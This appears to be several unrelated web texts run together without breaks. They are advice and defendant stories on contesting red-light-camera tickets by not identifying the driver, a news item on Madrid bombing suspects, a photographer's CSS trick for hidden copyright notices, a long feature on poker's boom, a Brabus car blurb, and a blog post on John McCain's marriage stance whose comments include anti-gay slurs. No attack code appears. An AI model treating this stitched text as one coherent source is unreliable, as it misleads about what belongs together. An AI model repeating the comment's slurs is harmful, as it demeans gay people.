Otherwise , some judges will trample all over you .
It is best to make the request ahead of time , before the trial date .
Examples of " It 's Not Me ! " Trials
1 . This defendant had to take her ( obvious ) gender mismatch ticket all the way to a court trial .
" My boyfriend had been driving my car .
It was NOT a Snitch Ticket .
They had actually submitted it to the court under my name even though the driver was obviously a male .
The officer either did n't care to check , or , more likely , thought I would cough up the name of the driver .
Everyone associated with these red light cameras had always assured us that an officer of the law would review the picture and if the driver did n't match the owner of the car , they would n't ticket the owner .
Liars .
So , having read highwayrobbery .
net , I knew what to do .
I went to the arraignment and pleaded , " NOT GUILTY , WRONG DEFENDANT . "
The judge did n't bother to review the evidence and arraigned me - THE WRONG DEFENDANT !
I always thought they had to arraign the accused .
I was proven wrong .
Note : at the courthouse , everyone I talked to asked me if I wanted to " nominate " someone else as the driver .
I always answered , " I am not going to testify . "
They never pressed for a name after I said that .
I showed up for trial .
About 20 minutes before our scheduled court time a cop showed up and asked everyone there for a red light camera ticket to step over to him .
He then called us one by one and offered to show us the infraction on video .
I declined .
That seemed to throw him off .
Make a note : do NOT let the cops schmooze you .
Anyway , there were a lot of " gender mismatches . "
In the hallway , before the cop got to me , I witnessed another cop schmoozing another woman .
She had obviously never visited highwayrobbery .
net .
They were trying to coerce her to give up the name of the driver .
I do n't know the resolution of her case ...
[ When it was my turn ] the cop pointed to the blanked - off picture of the front seat passenger and asked , " Is that you ? "
I answered , " Yes . " I do n't recommend that , however .
You could do the " I 'm not going to testify " even here ; even though this is outside of court and thus not testimony , it could be entered as " admission . "
I 'm not sure that would hurt since you could still choose , once the trial started , to not testify .
So they still could n't force you to cough up the driver 's name .
Next the cop pointed to the driver and asked , " Who is that ? "
I answered , " I am not going to testify . "
The cop said OK and directed me to enter the courtroom and wait till my name was called .
Next , to the trial .
The judge called my name .
As I was walking up to the podium , the cop moved for dismissal based on " gender mismatch . "
The judge granted it , and I was out ! "
2 . Here 's a defendant who showed up for trial and was given the " Third Degree " by the police .
The defendant 's story points out how careful you have to be when being interviewed by ( or negotiating with ) the police .
( Remember , you can " dummy up " and refuse to tell the police who was driving your car - you could even tell them that you do n't want to talk to them at all outside of trial - but it is illegal to give them false information or send them on a Wild Goose Chase . )
" I just got back from my trial appointment and my case was DISMISSED !
I followed your advice to the letter , I held firm , it got a little heated and the officer had the audacity to claim I was making false statements .
Heres how it went down .
The line was ridiculous by the way .
Before you see the trial judge they send you to see the video or photo in a different department .
After waiting about half an hour , I had the privilege of being interviewed by Officer R. Wiggums , from the city 's police department .
We sat .
OFFICER : Whos that ?
( Pointing to person in photo , obviously not me . )
ME : I want to see a judge .
OFFICER : What s going on ?
ME : I want to see a judge .
OFFICER : Well , we need to get some information first .
Tell me whos in the photo .
ME : I already told you I want to see a judge .
OFFICER ( serious now ) :
Okay , let me tell you whats gonna happen if you dont tell me who it is .
Im gonna do a Lexis - Nexis search on your address and if I find out who it is , I m gonna file charges against you for making false statements , filing a false report .
ME ( angry ) : I didnt make any false statements .
I told you ,  I want to see a judge . 
OFFICER : Are you telling me you dont know who this is ?
ME : I m telling you  I want to see a judge . 
OFFICER : And what are you gonna tell the judge when he asks you who it is ?
ME ( angry ) :
When the judge asks me , Ill respond to the judge .
OFFICER : Okay relax , I m just trying to straighten this out and help you out .
ME ( angry ) : No , you re not .
You just threatened me .
OFFICER : I didnt threaten you .
I just told you whats going to happen .
ME ( angry ) : Well I consider saying I made false statements a threat .
Im here for trial , thats what I m here for !
OFFICER : Okay , I m gonna dismiss your case , but youll be hearing from the D.A. "
3 . Here 's a case where the officer may have manipulated the evidence .
" My ticket was made out to me , a 55 year old male .
The driver appeared to be a young female .
I had read your site , but was not prepared for what happened at the trial .
Before the trial began , the officer showed me the photos and the video .
At no time did I see the photo of the driver .
I quietly asked the officer where the driver was , and he pointed to the blackened windshield which showed no driver .
I said nothing else and waited for the officer to present the information to the judge .
I fully expected that the judge would ask for the photo identifying the accused .
Incredibly , he did not .
He turned to me and asked if I had any testimony .
I replied that I did not , except for the fact that the officer did not present evidence that identified the driver .
Instead of asking the officer to present the information , the judge asked me , " So are you saying that you are not the driver ? "
I sort of panicked and said " yes " while hoping that my answer would not be considered as testimony .
At this point , he asked me for my license .
This seemed like he was now helping the prosecution , but I gave it to the bailiff anyway .
The judge then said he would look at his computer to see if the images were any clearer .
I again said nothing while thinking that he should ONLY rely upon the evidence presented by the officer .
In the end , he found me not guilty due to me not being the driver .
He then advised me that the officer may question me about who the other driver was and threw in more legal talk that seemed to include my Miranda rights .
I sat for a minute , and received my paperwork as the officer approached to quietly question me before I left .
I had seen this tactic before with other defendants , so I said nothing to him and walked toward the door .
I heard him say that we could just talk out in the hall .
Out in the hall he said , " So , who is the driver ? "
I turned to him and said , " That is information I am not going to provide . "
He just threw up his hands and left .
It occurred to me later that the officer chose not to print the photo of the driver , and edited the video so that it would also not identify the driver , which would have of course exonerated me . "
" It 's Not Me ! " - Why You Don't have to ID the Driver A judge can't force you to identify who it is in the photo , unless you give up your right to not testify .
On trial days , one judge ( now retired ) told the assembled defendants :
" There is one defense that I call the always - win - never - lose defense , pretty much an absolute defense in these tickets , and that defense is if you 're not the driver of the vehicle .
Deputy Porche has two things that he has to prove to this court , by proof beyond a reasonable doubt this morning in each of your cases .
First , he must prove that a vehicle went through a red light .
Second , he must prove that you , the person cited , were the driver of the car .
The primary way that he proves that you were the driver is with the photograph or the photographs .
If the photographs are not photographs of you driving the car he has not met his burden of proof , you 're ' not guilty , ' end of case , we do n't waste any time on those cases . "
From : WeHo Trial Transcript
Here is an excerpt from a law review article , which says the same thing but in more formal terms :
" In every case , a registered owner will be acquitted if the prosecution does not prove beyond a reasonable doubt that the owner was driving .
[ Footnote 48 ]
The existing 1995 law does not shift the burden of proof to the registered owner .
[ Footnote 49 ]
The owner must simply proceed through the established procedures for contesting a traffic citation ; the burdens of production and persuasion remain with the State of California . "
" Footnote 48 : See Cal . Penal Code Sec. 1096 ( declaring that , in a criminal proceeding , the burden of proving the defendant 's guilt beyond a reasonable doubt is upon the state ) ... "
" Footnote 49 : See Cal . Vehicle Code Sec. 21455.5 ( c ) ( stating no requirement that the defendant bear any burden of proof in defending herself against a charge for violating California Vehicle Code Sec. 21453 ( a ) ) . "
From : Stop ! Photographic Enforcement of Red Lights , by Steven Tafoya Naumchik , McGeorge Law Review 1999 , page 838 ( Cite as : 30 McGeorge L. Rev. 833 )
And here is the same message , in a " real life example . "
A convenience store clerk is shot .
The police examine the bullets and match the lands and grooves to information they have on file about a gun owned by you .
The security tape shows that the robber was alone and the picture is clear enough so that anyone can see it's not you , but the police charge you with the shooting anyway and you are hauled into court .
Your lawyer tells the judge it 's not you on the tape .
The judge looks at the tape , and agrees .
Should he immediately dismiss the case , or would it be OK for him to delay letting you go , and question you as to who the robber was ?
Some people think it should be OK to delay - that a lot more crimes would be solved if such arm - twisting was legal .
But so far , it is n't .
No judge would dare try such a tactic with a defendant represented by a lawyer , but some judges can't resist doing it to " pro per " defendants in traffic court .
In some other countries this right - to refuse to identify who was driving - does not exist .
In England , if you refuse to identify the driver , they will double your demerit points !
If you are going to a trial on an " It 's not me ! " ticket , you should also read all of Defect # 1 on the Home page .
End of Section 3 , " It 's Not Me ! "
The Madrid attacks were the worst of their kind in Europe
The move came after Spain 's El Mundo newspaper said Moroccan Rafa Zuher and Spaniard Jose Emilio Suarez had been in contact with police before the attacks .
The men are suspected of providing dynamite for the attacks , which killed 191 people and injured more than 2,000 .
The paper said they passed on details about drug deals and other crimes .
Link
Mr Suarez , a former miner , was arrested a week after the attacks and is the only Spanish - born suspect in custody .
According to El Mundo , he was an informant for the National Police , providing information about trafficking in weapons , drugs and explosives .
The paper said Mr Zuher , who was arrested later in March , had passed on information to the Civil Guards in Madrid about low - level drug deals involving hashish and ecstasy .
El Mundo , citing security sources for its report , said Mr Zuher was believed to be the link between Mr Suarez , who allegedly supplied the explosives , and the cell that carried out the attacks .
After the report was published , the Spanish interior ministry issued a statement saying it had ordered an investigation .
The ministry said that if necessary , the results of the inquiry would be handed over to a judge .
A Savvy Approach to Copyright Messaging
I ’m a photographer .
I ’m also a web geek .
And those two sides of my brain sometimes fight with each other .
As a photographer , I ’m outraged when people grab photos off the web and use them without consideration of copyright .
I ’ve been fighting this “ It ’s on the internet , so it must be free ! ” ignorance for more than a decade .
As a web geek , I love the freedom of the web .
I love that I can share my work with the whole world , for free .
This is the great gift of the internet .
So what to do ?
Faced with this dilemma , many photographers add a copyright notice to their photos like so .
I have two problems with this kind of copyright messaging .
Problem 1 : It ’s ineffective .
Someone determined to disregard your copyright can easily crop this out , so it does n’t actually solve the problem .
The small percentage of jerks who want to violate my copyright still can .
( Here ’s where some photographers say that this action shows “ willful misuse . ”
Okay , sure .
But “ willful misuse ” only comes into play when you talk damages , and 99 % of the time it never gets that far .
There is nothing in copyright law about defacing your work with a legal notice for it to be protected . )
Problem 2 : It ’s ugly .
The art of photography is about telling a story visually .
Any visual noise detracts from that story , and lessens the impact of the work .
Basically , copyright watermarks punish the vast majority of your viewers who will never violate your copyright , in an ineffective attempt to stop the tiny minority who will .
That ’s dumb .
But here ’s where the web geek portion of my brian kicks in :
There has to be a way to attach copyright information to a photograph online , without disturbing the natural viewing of that photo .
And there is .
Here ’s a photo of a Chihuahua I met the other day .
Notice that I added a giant copyright notice to the bottom .
This is better than a simple circle -c , because it explains what copyright means , and invites the viewer to contact me for usage permission .
( I think there would be fewer copyright freakouts if my fellow photographers could discuss it without , yaknow , freaking out . )
Your message could be whatever you want to say to your viewers ( and potential photo buyers ) .
It ’s crazy ugly , right ?
Right .
That ’s why , instead of putting the image in my webpage with a simple “ IMG SRC ” like we usually do , we ’re going to do something a little more savvy : put it in a DIV with the background set to the image , like so .
So instead of using code that looks like this :
< img src= ” image - url ” height = ” 123 ″ />
Use code like this :
< div style = ” height : 123px ; background : url ( image-url ) ” ></div >
And then just set the height to be the height of the photo itself , without the copyright statement .
That means the copyright notice is there , just layered behind the page .
If you view the image raw on the server ( like this ) , you ’d see the copyright notice .
UPDATE : To cover more edge cases ( and add a 1 px black border ) , you can expand the basic technique with a few more attributes .
( Thanks , Dan ! )
< div style = ” height : 123 px ; width : 234 px ; border : 1 px solid # 000 ; background : url ( image - url ) ; background - repeat : no - repeat ; overflow : hidden ” ></div >
( Side benefit :
This technique also disables the “ save image ” right - click in most browsers , another ineffective measure employed by photographers to thwart only the laziest of thieves . )
Of course , this technique does not stop people from taking screen shots .
It also does not stop people from thinking you ’re a self - important photographer with a thing for little dogs .
So be it .
This technique just makes sure that , if someone grabs your image and puts it on another site , the viewers will know who owns it .
They ’ll also know the person who posted it is a jerk who does n’t respect artists ’ copyrights .
Downside ?
It adds a little weight to the image ( 52 k to 64 k in this case ) , makes writing the code slightly more complicated , and wo n’t work in some older browsers .
But that ’s all solvable stuff .
( Bonus points to the savvy coder who whips up a WordPress plugin to add photos this way ! )
Most importantly , this allows photographers to add human - readable copyright messages to their work that stays with the photo but does n’t get in the way of the vast majority of viewers who just want to enjoy the photo for a moment , and then go on with their day .
It ’s enough to make the two sides of my brain stop fighting for a moment .
Check out the update . →
DOYLE BRUNSON ( above , left ) is a poker legend .
Twice winner of the game 's most prestigious annual tournament , the World Series of Poker ( WSOP ) , held in Las Vegas , the cowboy - hat - clad southerner affectionately known as Texas Dolly also wrote what many consider to be the bible of poker theory , “ Super System : A Course in Power Poker ” .
His reputation among card - shufflers borders on the superhuman .
Indeed , after fighting off supposedly terminal cancer in the 1960s , he celebrated his return to the cardrooms with 53 straight wins .
Adding to the mystique , both of his World Series titles were won with exactly the same cards : a full house of tens over twos .
Now in his mid-70s , Mr Brunson is still going strong .
But not strong enough for Annette Obrestad ( above , right ) , who beat the old master and 361 other entrants in September to win the first ever WSOP event held outside America .
Miss Obrestad 's victory , which netted her £ 1 m ( $ 2 m ) , shows how much poker has changed since the days when Texas Dolly , Amarillo Slim Preston and Jack “ Treetops ” Straus held sway .
She is only 19 ( making her the youngest ever winner of a World Series bracelet ) and she is , of course , a woman .
She hails from Norway , not Nevada .
And though she had previously won over $ 800,000 in internet tournaments , the event at London 's Empire Casino was the first time she had encountered serious opposition in the flesh .
The poker press refers to her by her online moniker , annette_15 .
Miss Obrestad 's route to the grand prize — dumped on the final table in bundles of $ 50 notes , as is the World Series tradition — required her to see off such modern - day poker luminaries as Chris “ Jesus ” Ferguson , a hirsute scholar of game theory , Dave “ Devilfish ” Ulliott , a somewhat less cerebral but wily British professional who wears diamond - encrusted knuckledusters , and Phil “ Poker Brat ” Hellmuth , arguably the most celebrated ( not least by himself ) modern player .
Jim McManus , a poker player and historian , describes the young Scandinavian 's win as a “ startling milestone ” .
Yet it is also part of a trend .
Youngsters are flocking to poker as never before , attracted by its growing cachet and the ever - expanding pots .
The plethora of books , blogs and DVDs now easily accessible , and the rapid growth of poker online , means newcomers can learn the art much more quickly than in earlier eras .
“ When I started out it took years of hard grind at the table to get good .
Now the learning curve is much steeper , ” says Howard “ The Professor ” Lederer , a professional player .
It is often said that while Texas Hold ' Em , the most popular version of poker , may take only minutes to learn , it takes a lifetime to master .
Annette_15 may beg to differ .
The threat to the old guard from quick - learning online players first became apparent in 2003 , when the aptly named Chris Moneymaker won the World Series after qualifying through a satellite tournament for players on a poker website .
He turned his $ 40 fee ( a tiny fraction of the $ 10,000 “ buy - in ” for the pros ) into $ 2.5 m , finishing off his final opponent with a colossal bluff .
This year 's winner in Vegas , Jerry Yang , qualified the same way .
After two weeks of intense play , with daily sessions lasting up to 16 hours , the 39 - year - old psychologist went home $ 8.25 m richer , promising to give much of it to charity .
No other sporting competition ( if poker can be called a sport ) offers the same reward .
Popular websites such as Full Tilt Poker and PokerStars enjoy peak traffic of tens of thousands of visitors at any given time , occasionally over 100,000 .
Full
Tilt offers visitors the chance to try their wits against a roster of professionals , who play under their own names and are paid according to how well known they are .
Poker sites employ some of the snazziest software on the web .
They also offer a dizzying array of blogs and forums , which debate everything from “ slowplaying ” ( playing a strong hand with deceptive passivity ) to Morton 's Theorem ( do n't ask ) .
One recent discussion had more than 1,600 participants .
No wonder it is often said that poker has done more than anything apart from pornography to develop the web .
Star of the small screen
The other force fuelling poker 's growth is television .
The game has grown rapidly on the small screen since camera crews worked out a way to show the “ hole cards ” ( those dealt face down to each player ) using miniature cameras positioned beneath specially designed tables with glass panels .
This allowed viewers to see each hand 's dynamics as they unfolded .
Televised celebrity games have added to poker 's appeal .
Ben Affleck , Toby Maguire and James Woods are among those who consider themselves accomplished amateurs .
Mr Affleck even hired a pro to help him raise his game , and subsequently won California 's state poker tournament .
Today poker is the third most watched sport on cable television in the United States , after car racing and American football , trumping even NBA basketball .
In America , it is regularly aired on ESPN and the Travel Channel , while Britain has its own poker channel .
ESPN 's World Series shows regularly get more than 1 m viewers , and numbers hold up well even during the busiest sports periods , such as during the major - league baseball play - offs and the NASCAR motorsports season .
AP
The poker economy has never been flusher .
There are an estimated 60 m - 80 m regular players in America and perhaps 80 m - 100 m elsewhere .
Poker is by far the largest chunk of the online gambling market , which had worldwide revenues of around $ 15 billion in 2006 — a figure that may be closer to $ 20 billion this year .
Poker chips are among the best - selling items on Amazon.com .
What was once the preserve of either high - rollers or low - lifes is now being roundly embraced by the mass of ordinary folk in between .
The changing of the guard at the top of poker reflects this move into the mainstream .
Harrah's , the casino operator that runs the WSOP , has brought in Jeffrey Pollack , a former NASCAR executive , to smooth its image and entice in corporate money .
He has revamped the website , wrung more money out of ESPN and put poker on the radio ( where it works surprisingly well ) .
More impressively , he has lured dozens of sponsors — including Hershey 's chocolate , Milwaukee 's Best Light beer and Planters peanuts ( “ the nuts ” being the term for an unbeatable hand of cards ) — into a game that many consider morally questionable .
Mr Pollack says his aim is to run the WSOP , which was conceived in the late 1960s , as a “ 38 - year - old start - up ” , constantly innovating and pushing into less developed markets in Europe , Asia and Latin America .
An annual tournament in Macau is likely to be the next move .
That would put the World Series head to head with the new Asia Pacific Poker Tour , which is sponsored by the PokerStars website .
In some Asian countries , such as Thailand , poker is illegal .
But China is a potentially huge market , and the game has exploded in popularity in Australia .
Some 400,000 Australians joined poker leagues after Joe Hachem , from Melbourne , won the World Series in 2005 .
That burst of activity prompted a government inquiry .
Another largely untapped market is women .
They make up only around one in 20 of all tournament entrants , though Miss Obrestad 's victory is likely to encourage more to take the plunge .
Mr McManus , who teaches a poker course at a Chicago college , says his female students have just as much of a feel for the game as his male ones .
But he also thinks men have the edge in no-limit Texas Hold ' Em , which relies more heavily than other forms of poker on aggression and the willingness to risk everything on a single hand .
Some of the game 's most eloquent player - commentators are women , notably Annie Duke , who has won more than $ 3 m in prize money , and Victoria Coren , winner of the London leg of last year 's European Poker Tour and author of a poker column in Britain 's Guardian .
Ms Coren describes poker as “ a stimulating psychological challenge , combining guts and detective work ... a world of its own , offering all the childish appeal of secret places , special languages and staying up late at night . ”
It is hard to imagine Mr “ Devilfish ” Ulliott describing it that way .
Both would agree , however , that the best players display a good deal of skill , and that poker is a long way from basic forms of gambling such as roulette or lotteries .
The object , says Ms Coren , is to control the swings of luck with skill , figuring out how to win the maximum with your luckiest hands and lose the minimum with your unluckiest ones .
The skill - versus - luck debate has crackled back to life because of the passage of a law last year , sneakily tacked on to a port - security bill , which sought to bolster existing legislation against internet wagering by blocking Americans ' access to accounts that can be used to gamble online .
All games that are “ predominantly ” subject to chance were covered by the ban .
Poker was included .
For reasons best explained by lobbyists , horse racing , fantasy sports and lotteries were exempted .
This discrepancy had already landed America in hot water at the World Trade Organisation , thanks to a case brought by tiny Antigua , home to several online gambling sites .
America 's Department of Labour has given a nod to the element of skill , in some eyes , by last year recognising “ professional poker player ” as an official occupation .
Courts , however , tend to view poker as a game of chance .
That , Mr Lederer is convinced , is only because the opposing arguments have been botched at the bench .
As he concedes , it is hard to argue that a seasoned professional will beat a first - timer in any given hand .
But there is evidence aplenty that , over the long run , a player with a head for calculating odds and a feel for the psychology of the game , such as bluffing , will always overcome an untalented opponent .
The skill , Mr Lederer argues , is in the betting .
And it is apparent in the fact that you can win without the best hand .
More than half of all hands end without the cards being shown , not because one player got lucky but because he managed to persuade the others , given their analysis of the available information and the size of the pot , that it was sensible to fold .
When no one declares their hand , can it really be argued that the outcome was determined by luck ?
At the highest level , decisions about betting , bluffing and folding are based on the complex juggling of probabilities .
“ What drew me to poker is that it is essentially an academic endeavour , ” says Ms Duke .
She is one of a growing group of full - time players who came to poker through game theory and mathematics , not through any love of a flutter .
( Indeed , she never plays craps or roulette . )
Others include Mr Lederer ( her brother ) and Mr Ferguson , who has a doctorate in computer science and writes academic papers on probability theory with his father , a statistician at UCLA .
Thomas Bihl , winner of a recent HORSE tournament , in which players have to show mastery of five different styles of poker , thinks the game has more in common with finance than it does with basic forms of gambling , because it requires the constant pricing and repricing of risk .
Mr Bihl , a former stock trader , says the move from his old job into poker was a natural progression .
Though his £ 71,000 win was “ a huge lift ” , he says that he is motivated not by money but by the chance to use his brain to outfox opponents .
This is a common refrain among regular players .
As Ms Coren put it in a recent article : “ Cash is nothing more than chips , just the tools of the trade , like fishing rods to an angler .
The game is all about money , and nothing to do with money . ”
Those who think skill predominates also point to the fact that some players excel at the game while others do n't .
Dan Harrington made the final table of the WSOP in both 2003 and 2004 , the odds of which would be 25,000 to one if it were down to chance .
Stu “ The Kid ” Ungar , a brilliant player with a self - destructive streak , won three times in not many more attempts before succumbing to drugs .
Moreover , when wealthy amateurs pit their wits against professional players steeped in poker theory , more often than not they lose their shirts .
In a number of sessions beginning in 2001 , Andy Beal , a Dallas - based banker , locked horns with a syndicate of pros , including Mr Lederer , convinced that he could come out on top .
He did not .
After two weeks of poker , with daily sessions lasting up to 16 hours , Jerry Yang , a psychologist , went home $ 8.25 m richer
Nevertheless , luck is important .
It blends with skill to produce a game that is “ much like life , full of incomplete information and second - guessing , ” says Mr Lederer .
Poker is certainly more exciting to most than chess , a game of complete information and limited psychology where the better player always wins .
Tellingly , whereas computers can be programmed to play chess at the highest level , they still have a long way to go to match expert players in poker games with more than two participants .
The best attempt so far , Polaris , developed by researchers at the University of Alberta , failed to get the better of two top players , Ali Eslami and Phil “ Unabomber ” Laak ( who plays hooded ) .
Moreover , professionals say that poker 's generous dollop of luck is good for them on balance , because it attracts money from neophytes who fancy their chances of beating the top players in tournaments .
Some pros disparagingly call such players “ ATMs ” .
But , as Mr Moneymaker showed , the newcomers occasionally win big .
His victory in 2003 led to a surge in entrants for the World Series main event from 512 in 2000 to 8,773 in 2006 .
A dip this year to 6,358 reflected the new American law 's effective ban on internet sites buying satellite - competition winners into the tournament .
( Some tried to get around this by sending the winners cheques instead , but most recipients simply held on to the money rather than using it to buy themselves in . )
“ It does n't take most young people long to realise they wo n't be the next Michael Jordan .
But they can all aspire to be the next Phil Hellmuth , and they do n't even have to work out , ” says Mr Hellmuth , slurping a full - cream mocha .
He then quickly points out that poker requires a great deal of mental stamina , and that he promotes an energy drink .
Poker for pupils
Parents are increasingly encouraging their children to play , he adds , because it is mentally more rewarding than video games and does not mix well with alcohol ( at least if you care about winning ) .
“ When I started it was seen as a bit of an outlaw pastime , for rogues and cheats .
Now it 's a huge bottom - up movement , ” he says .
It might seem a bit of a leap to go from here to putting poker on the curriculum .
But some academics see it as a worthy subject of study .
Chief among them is Charles Nesson , a professor at Harvard Law School .
Earlier this year he founded the Global Poker Strategic Thinking Society ( GPSTS ) , whose awkward name belies a clear set of goals : to highlight poker 's role in teaching patience , strategy and money management , and in improving cognitive skills .
“ Poker offers metaphors for a range of life skills and could be a wonderful educational tool , ” says Mr Nesson , who plays a regular game with other law professors , including Alan Dershowitz — though he has yet to play with Antonin Scalia , a Supreme Court justice known to have a fondness for poker .
Poker is , first and foremost , a game of managing resources , argues Mr Nesson , teaching a cautious approach to risk - taking , not recklessness .
There is some evidence for this .
One study , comparing experienced poker players with financial - market traders , found the players less likely to exhibit over - confidence .
An unlikely social - welfare tool
Determined to counter what he sees as the demonisation of poker by the American right , and the resulting squeeze on personal freedoms , Mr Nesson is working on a pilot programme to teach the game to disadvantaged children in schools in America and Jamaica .
He muses about turning a property he runs in Second Life , a virtual world , into an online poker university .

Bets are on at the World Series
Ms Duke sees other ways in which poker teaches “ life skills ” .
It taught her , for instance , how to be a good loser ( “ Even the best lose most of the hands they play .
If you let that get to you , it will kill you ” ) .
She says she even uses poker theory when dealing with her children : “ I always bet the minimum when making a threat .
If you say no TV rather than no Disneyland , you can always raise later . ”
By enlisting the help of players , statisticians , law students and lobby groups such as the Poker Players Alliance , whose membership has swollen to 860,000 , Mr Nesson hopes to roll back not only the federal ban on online gambling but also the worst bits of the nonsensical patchwork of state laws .
Massachusetts law , for instance , makes it hard for the university to hold even a charity poker tournament .
“ Are they afraid that people will become addicted to giving money to good causes ? ” asks Andrew Woods , a Harvard student who helps to run the GPSTS .
As the pokeristas sharpen their legal arguments , they are hoping for some extra help from the statisticians .
Online poker sites have reams of game - by - game data .
These could , in theory , be used to show what makes some players better than others , and what defines their skill ( Bluffing ?
Shrewd betting based on the rapid calculation of odds ?
Or both ? ) .
Though research in this area has been thin on the ground to date , number - crunchers are starting to rise to the challenge .
Among them is Steven Levitt , an economist at the University of Chicago and author of “ Freakonomics ” .
He oversees a project called Pokernomics .
It aims to collect millions of hands ( which players can store using readily available tracking software ) and analyse them systematically in the hope of answering questions .
Does a big stack of chips allow players to bully others and win even more ?
To what extent does position relative to the dealer matter ?
Are there simple strategies that can be used to win money even with losing hands ?
These efforts may produce fascinating results .
Or they might reveal nothing much .
Even if the data highlight strong trends , it may still not be clear which are caused by skill and which by luck , says Jay Kadane , a statistics professor at Carnegie Mellon University who studies games .

Poker 's getting bigger
Perhaps a better way to win over judges and lawmakers would be to highlight poker 's place in the American psyche .
Introduced by French colonials , as a game called poque , it soon spread from its original base in the Mississippi delta .
By the late 19th century it had become a prominent cultural facet across the country , not only in the South or Wild West .
Much ink has been spilled analysing its appeal to Americans .
The answer may lie no deeper than Walter Matthau 's one - liner about poker exemplifying “ the worst aspects of capitalism that have made our country so great ” .
Poker has long fascinated America 's great and good , from politicians to generals to captains of industry .
Presidents Roosevelt ( both ) , Truman , Eisenhower and Nixon were all keen players .
Nixon was famously good : most of the funding for his first congressional run came from poker winnings .
Poker was said to have inspired cold - war tacticians .
It is still a useful military motif : recall the playing cards used to represent Saddam Hussein and his most - wanted cohorts .
Poker financed a sizeable chunk of Microsoft 's start - up costs .
Bill Gates once said he learned more about business strategy at the baize than in classrooms — though these days he apparently prefers the more stately game of bridge .
Not all famous players have made such good role models .
As he partied away the declining years of his career , Errol Flynn incurred some excruciating poker losses , including , on one particularly bad night , a Caribbean island he had hoped to develop into a holiday resort .
John Wayne had some shockers too , though in one memorable game he won Lassie from the canine star 's desperate owner .
Getting serious
What would Nixon , Flynn and Wayne have made of poker today ?
They would surely have marvelled at the transformation of “ the cheater 's game ” into a multi-billion - dollar industry , pumping out new millionaires almost daily .
Even they might have been shocked at the latest season of “ High Stakes Poker ” , a television series in which players buy into each game for $ 500,000 apiece and the winner takes home more than $ 5 m .
They might , perhaps , have been disappointed that the game had lost some of its backroom edginess .
Miss Obrestad 's generation are more likely to put their excess winnings into tax - free bonds than blow them betting on a single round of golf , as Mr Brunson and his Las Vegas pals used to do in their madder moments .
Still , those hoping to win over poker 's sceptics will find no better example than young annette_15 .
She is stern , sober and chillingly focused on her game .
She appears to be exceptionally good at it too .
Either that or amazingly lucky .
Brabus have released a modified version of the Mercedes McLaren SLR Roadster which has several performance and design upgrades from the original .
The car features many upgrades but most prominently upgraded is the engine whose power is upgraded to 650 hp allowing it to get to 100 kph in just 3.6 seconds .
Brabus also modified the aerodynamics of the car especially the nose allowing it to stick better to the road .
The interior features a new ergonomically shaped Brabus sport steering wheel is used which integrates the cars transmission into the grip of the wheel as well as carbon fiber panels on the dashboard and other parts of the interior
The Brabus sports of a V8 compressor engine producing a 6500 rpm .
The entire engine & exhaust are custom made to take all the power & to deliver the maximum output .
The cooling systems & the engine interior are custom made to quench the thirst for power of this super car .
The interior of the car looks both catchy and striking .
Yet at no point has elegance and comfort been overlooked .
The car has carbon fiber applications for dashboard , center console and door trim transfer the racing look of the BRABUS body components into the interior .
The exposed carbon - fiber trim can be color - coordinated with the leather color of the interior .
The steering wheel is also ergonomically shaped to give more seating space and offers integrated buttons for data transmission .

Yo McCain : Are we not humans ?
Do we not have lives ?
by Jeremy Hooper
Want a very simple reason to not vote for John McCain ?
Well just consider this .
On his website , he has the gall to put his ideas for " protecting marriage " ( i.e. stemming the tide of gay nuptials ) under the category of " Human Dignity & the Sanctity of Life . "
As if it is either dignified or life - enhancing to keep it so that some humans are less entitled to equality than others .
The fact that he and his staffers would be so bold as to frame the matter in this speciously " humane " fashion should be a deal breaker for anyone seeking an inclusive world .
On the site , McCain 's marriage stance reads :
Protecting Marriage
As president , John McCain would nominate judges who understand that the role of the Court is not to subvert the rights of the people by legislating from the bench .
Critical to Constitutional balance is ensuring that , where state and local governments do act to preserve the traditional family , the Courts must not overstep their authority and thwart the Constitutional right of the people to decide this question .
The family represents the foundation of Western Civilization and civil society and John McCain believes the institution of marriage is a union between one man and one woman .
It is only this definition that sufficiently recognizes the vital and unique role played by mothers and fathers in the raising of children , and the role of the family in shaping , stabilizing , and strengthening communities and our nation .
As with most issues vital to the preservation and health of civil society , the basic responsibility for preserving and strengthening the family should reside at the level of government closest to the people .
In their wisdom , the Founding Fathers reserved for the States the authority and responsibility to protect and strengthen the vital institutions of our civil society .
They did so to ensure that the voices of America 's families could not be ignored by an indifferent national government or suffocated through filibusters and clever legislative maneuvering in Congress .
Every argument that 's presented is based in the same sort of hyperbolic rhetoric that conservatives have been using for years to reframe this issue into one that puts their team on the right side of morality .
The ideas all pander to those who think the term " family " can only be defined in one narrow way .
And while he does n't call for a federal ban , it 's clear that he would absolutely get behind one if he saw such a need ( just like he got behind the ban in his home state of Arizona ) .
If anything , McCain should position his marriage ideas under the category : " Promotion of One- sided Judeo - Christian Values & the Sanctity of Heterosexism . "
While we 'd clearly still disagree with him about whether gay couples are fit to enter into a legal bond , at least we could respect his honesty a little more .
As it stands , however , he is positing the idea that to ban decent , tax - paying , queer citizens from marriage equality is not only preferred for the wellness of society , but also in order to encourage " Human Dignity & the Sanctity of Life . "
Perhaps
I 've once too many suffered the indignity of having to fight for rights and benefits that my married heterosexual friends take for granted , but this queer writer has a tough time viewing these attempts to discredit my live and love as anything less than shameful !
Human Dignity & the Sanctity of Life [ JohnMcCain.com ]
** Just to clarify -- this post never says that McCain does currently support a federal amendment , only that all clues say he would if he saw such a need .
And this is not meant to make McCain seem like the king of all ' phobes -- only as yet another conservative who is , for political gain , disseminating fear about gays and their relationships and the threats such supposedly pose to society .
We did n't think such required more explanation , but judging a comment left on this post , it apparently does .
Your thoughts
" And while he does n't call for a federal ban , it 's clear that he would absolutely get behind one if he saw such a need " Did n't McCain lead the Republican opposition to the FMA ?
I recall him arguing from the floor of the Senate that this amendment thwarted the ability of the states to determine their own laws .
In fact he 's said that the only time he 'd support such an amendment would be if the federal courts overturned the decisions of the states and forced them to recognize gay marriage .
He 's not in favor of marriage equality .
Shame on him .
But he also is not in favor of force Massachusetts or California to follow his beliefs as you are falsely claiming .
Shame on you .

OMG , Timothy .
That is completely out of line !
What the post says is that he would get behind one if he saw such a need ( such as with a federal decision like you mention ) .
No more no less .
That is a fair and accurate statement .
There is no implication that he is " in favor of force [ sic ]
Massachusetts or California to follow his beliefs , " only that his beliefs in general are contrary to marriage equality ( which could result in an FMA push if he saw a " threat " ) .

Yep , the adulterer is solidly against the fags and dykes - how not surprising .

I 'm not voting for him because his face is 4 different colors .
Posted by : Franc | Feb 20 , 2008 3:54:47 PM
Jeremy , I think we 'll have to disagree a little on this one .
